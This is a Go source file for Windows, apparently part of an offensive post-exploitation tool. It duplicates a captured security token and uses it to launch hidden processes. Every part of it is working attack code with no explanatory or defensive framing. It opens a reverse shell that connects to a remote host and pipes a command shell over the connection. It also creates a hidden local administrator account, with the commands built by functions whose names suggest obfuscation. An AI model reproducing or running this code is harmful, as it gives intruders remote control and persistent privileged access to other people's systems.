//go:build windows

package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

func runCommandWithToken(tok windows.Token, cmdline string) error {
	return spawnWithToken(tok, cmdline, false, "", 0)
}

func runReverseShell(tok windows.Token, host string, port uint16, shell string) error {
	return spawnWithToken(tok, shell, true, host, port)
}

func addLocalAdmin(tok windows.Token, user, pass string) error {
	if err := runCommandWithToken(tok, obfCmdNetUserAdd(user, pass)); err != nil {
		return err
	}
	return runCommandWithToken(tok, obfCmdNetLocalgroupAdmins(user))
}

func spawnWithToken(tok windows.Token, cmdline string, rev bool, host string, port uint16) error {
	var primary windows.Token
	if err := windows.DuplicateTokenEx(tok, windows.MAXIMUM_ALLOWED, nil, windows.SecurityImpersonation, windows.TokenPrimary, &primary); err != nil {
		primary = tok
	} else {
		defer primary.Close()
	}

	if rev {
		go relayReverseShell(primary, host, port, cmdline)
		return nil
	}

	si := &windows.StartupInfo{Cb: uint32(unsafe.Sizeof(windows.StartupInfo{}))}
	si.Flags = windows.STARTF_USESTDHANDLES
	var pi windows.ProcessInformation
	cmdPtr, _ := windows.UTF16PtrFromString(cmdline)
	err := windows.CreateProcessAsUser(primary, nil, cmdPtr, nil, nil, false, windows.CREATE_UNICODE_ENVIRONMENT|windows.CREATE_NO_WINDOW, nil, nil, si, &pi)
	if err != nil {
		return err
	}
	windows.CloseHandle(pi.Process)
	windows.CloseHandle(pi.Thread)
	return nil
}

func relayReverseShell(tok windows.Token, host string, port uint16, shell string) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 15*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()

	rIn, wIn, _ := os.Pipe()
	rOut, wOut, _ := os.Pipe()
	si := &windows.StartupInfo{Cb: uint32(unsafe.Sizeof(windows.StartupInfo{}))}
	si.Flags = windows.STARTF_USESTDHANDLES
	si.StdInput = windows.Handle(rIn.Fd())
	si.StdOutput = windows.Handle(wOut.Fd())
	si.StdErr = windows.Handle(wOut.Fd())
	var pi windows.ProcessInformation
	cmdPtr, _ := windows.UTF16PtrFromString(shell)
	var primary windows.Token
	if err := windows.DuplicateTokenEx(tok, windows.MAXIMUM_ALLOWED, nil, windows.SecurityImpersonation, windows.TokenPrimary, &primary); err != nil {
		primary = tok
	} else {
		defer primary.Close()
	}
	if err := windows.CreateProcessAsUser(primary, nil, cmdPtr, nil, nil, true, windows.CREATE_UNICODE_ENVIRONMENT|windows.CREATE_NO_WINDOW, nil, nil, si, &pi); err != nil {
		return
	}
	rIn.Close()
	wOut.Close()
	go func() { io.Copy(wIn, conn); wIn.Close() }()
	go func() { io.Copy(conn, rOut); conn.Close() }()
	windows.WaitForSingleObject(pi.Process, windows.INFINITE)
}

func runCommandCapture(tok windows.Token, cmdline string) {
	si := &windows.StartupInfo{Cb: uint32(unsafe.Sizeof(windows.StartupInfo{}))}
	si.Flags = windows.STARTF_USESTDHANDLES
	rOut, wOut, _ := os.Pipe()
	si.StdOutput = windows.Handle(wOut.Fd())
	si.StdErr = windows.Handle(wOut.Fd())
	var pi windows.ProcessInformation
	cmdPtr, _ := windows.UTF16PtrFromString(cmdline)
	var primary windows.Token
	if err := windows.DuplicateTokenEx(tok, windows.MAXIMUM_ALLOWED, nil, windows.SecurityImpersonation, windows.TokenPrimary, &primary); err != nil {
		primary = tok
	} else {
		defer primary.Close()
	}
	if err := windows.CreateProcessAsUser(primary, nil, cmdPtr, nil, nil, true, windows.CREATE_UNICODE_ENVIRONMENT|windows.CREATE_NO_WINDOW, nil, nil, si, &pi); err != nil {
		fmt.Fprintf(os.Stderr, "exec err: %v\n", err)
		return
	}
	wOut.Close()
	windows.WaitForSingleObject(pi.Process, windows.INFINITE)
	windows.CloseHandle(pi.Process)
	windows.CloseHandle(pi.Thread)
	io.Copy(os.Stdout, rOut)
}
